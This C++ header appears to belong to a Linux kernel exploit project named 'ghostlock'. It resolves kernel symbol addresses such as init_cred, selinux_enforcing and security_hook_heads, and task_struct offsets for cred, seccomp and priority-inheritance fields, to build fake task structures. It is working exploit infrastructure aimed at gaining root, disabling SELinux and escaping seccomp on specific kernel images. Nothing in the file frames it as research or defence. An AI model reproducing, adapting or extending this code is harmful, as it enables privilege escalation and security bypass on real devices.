#ifndef RUNTIME_STRUCT_OFFSETS_H
#define RUNTIME_STRUCT_OFFSETS_H

#include "profile/model.h"
#include "session/exploit_session.hpp"

namespace ghostlock::profile {
    /* Value from the loaded profile, falling back to the compile-time default. */
    inline uint32_t symbol_or_default(uint32_t value, uint32_t fallback) {
        return ghostlock::session::g_exploit_session.profile.or_default(value, fallback);
    }

    /* The transport is split into objects (wire v2), so a field is read through
     * a getter rather than a kernel_offsets member pointer. */
    template<typename F>
    inline uint32_t symbol_u32(F get, uint32_t fallback) {
        const kernel_offsets *values = ghostlock::session::g_exploit_session.profile.values();
        return symbol_or_default(values ? static_cast<uint32_t>(get(*values)) : 0,
                                 fallback);
    }

    /* Defined in support/util.cpp: logging lives there, and this header is
     * included from common.h before the logging macros are available. */
    [[noreturn]] void fatal_missing_task_offset(const char *name);

    /* A missing value used to fall back to the 6.6 layout, which writes the
     * wrong field on this 5.10 image. Fail closed instead. */
    template<typename F>
    inline uint32_t require_task_offset(F get, const char *name) {
        const kernel_offsets *values = ghostlock::session::g_exploit_session.profile.values();
        const uint32_t value = values ? static_cast<uint32_t>(get(*values)) : 0;
        if (value == 0) fatal_missing_task_offset(name);
        return value;
    }

    template<typename F>
    inline uint64_t symbol_image(F get, uint64_t fallback) {
        return ghostlock::kernel::KIMAGE_TEXT_BASE +
               static_cast<uint64_t>(symbol_u32(get, static_cast<uint32_t>(fallback)));
    }

    inline uintptr_t init_task() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.init_task; },
            ghostlock::kernel::INIT_TASK_OFF);
    }

    inline uintptr_t init_cred() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.init_cred; },
            ghostlock::kernel::INIT_CRED_OFF);
    }

    inline uintptr_t empty_zero_page() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.empty_zero_page; }, 0);
    }

    inline uintptr_t root_task_group() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.root_task_group; },
            ghostlock::kernel::ROOT_TASK_GROUP_OFF);
    }

    inline uintptr_t selinux_enforcing() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.selinux_enforcing; },
            ghostlock::kernel::SELINUX_ENFORCING_OFF);
    }

    inline uintptr_t selinux_blob_sizes() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.selinux_blob_sizes; },
            ghostlock::kernel::SELINUX_BLOB_SIZES_OFF);
    }

    inline uintptr_t security_hook_heads() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.security_hook_heads; },
            ghostlock::kernel::SECURITY_HOOK_HEADS_OFF);
    }

    inline uintptr_t slide_nfulnl_logger_image() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.slide_nfulnl_logger; },
            ghostlock::kernel::SLIDE_NFULNL_LOGGER_OFF);
    }

    inline uintptr_t slide_loggers_0_1_image() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.slide_loggers_0_1; },
            ghostlock::kernel::SLIDE_LOGGERS_0_1_OFF);
    }

    inline uintptr_t slide_random_boot_id_data_image() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.slide_boot_id; },
            ghostlock::kernel::SLIDE_RANDOM_BOOT_ID_DATA_OFF);
    }

    inline uintptr_t slide_init_task_image() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.init_task; },
            ghostlock::kernel::INIT_TASK_OFF);
    }

    inline uintptr_t slide_root_task_group_image() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.root_task_group; },
            ghostlock::kernel::ROOT_TASK_GROUP_OFF);
    }

    inline uintptr_t slide_sysctl_bootid_image() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.slide_boot_id; },
            ghostlock::kernel::SLIDE_SYSCTL_BOOTID_OFF);
    }

    inline uint32_t fake_task_prio_off() {
        return require_task_offset(
            [](const kernel_offsets &v) { return v.task.prio; }, "prio");
    }

    inline uint32_t fake_task_normal_prio_off() {
        return require_task_offset(
            [](const kernel_offsets &v) { return v.task.normal_prio; }, "normal_prio");
    }

    inline uint32_t fake_task_task_group_off() {
        return require_task_offset(
            [](const kernel_offsets &v) { return v.task.sched_task_group; }, "sched_task_group");
    }

    inline uint32_t fake_task_pi_lock_off() {
        return require_task_offset(
            [](const kernel_offsets &v) { return v.task.pi_lock; }, "pi_lock");
    }

    inline uint32_t fake_task_pi_waiters_off() {
        return require_task_offset(
            [](const kernel_offsets &v) { return v.task.pi_waiters; }, "pi_waiters");
    }

    inline uint32_t fake_task_pi_top_task_off() {
        return require_task_offset(
            [](const kernel_offsets &v) { return v.task.pi_top_task; }, "pi_top_task");
    }

    inline uint32_t fake_task_pi_blocked_on_off() {
        return require_task_offset(
            [](const kernel_offsets &v) { return v.task.pi_blocked_on; }, "pi_blocked_on");
    }

    inline uint32_t task_cred_off() {
        return require_task_offset(
            [](const kernel_offsets &v) { return v.task.cred; }, "cred");
    }

    inline uint32_t task_comm_off() {
        return require_task_offset(
            [](const kernel_offsets &v) { return v.task.comm; }, "comm");
    }

    inline uint32_t task_seccomp_off() {
        return require_task_offset(
            [](const kernel_offsets &v) { return v.task.seccomp; }, "seccomp");
    }
} // namespace ghostlock::profile

#endif
